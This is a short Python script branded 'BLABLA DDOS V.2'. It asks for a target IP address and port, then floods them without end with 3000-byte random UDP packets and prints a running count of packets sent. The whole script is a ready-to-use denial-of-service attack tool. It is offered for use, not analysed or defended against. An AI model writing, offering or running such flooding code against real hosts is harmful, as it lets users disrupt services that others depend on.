import os
import socket
import random
from requests import get
import json
import  sys
os.system("clear")
banner = """
###################
# BLABLA DDOS V.2 #
# CODE BY BLABLA  #
###################
"""
print(banner)
def get_ips_for_host(host):
    try:
        ips = socket.gethostbyname_ex(host)
    except socket.gaierror:
        ips=[]
    return ips
ips = get_ips_for_host('www.google.com')
print(repr(ips))
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
print(f"Your Hostname: {hostname}")
print(f"Your IP Address: {ip_address}")


target_ip = input("Target ip address Exp(193.10.233.344) = ")
     
target_port = int(input("Target Port: "))

byte = random._urandom(3000)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

how_many_packages_did_we_send = 0

while  True:
    s.sendto(byte,(target_ip,target_port))

    how_many_packages_did_we_send += 1
    print("Attack stated! ,Package send=")
    print(how_many_packages_did_we_send)

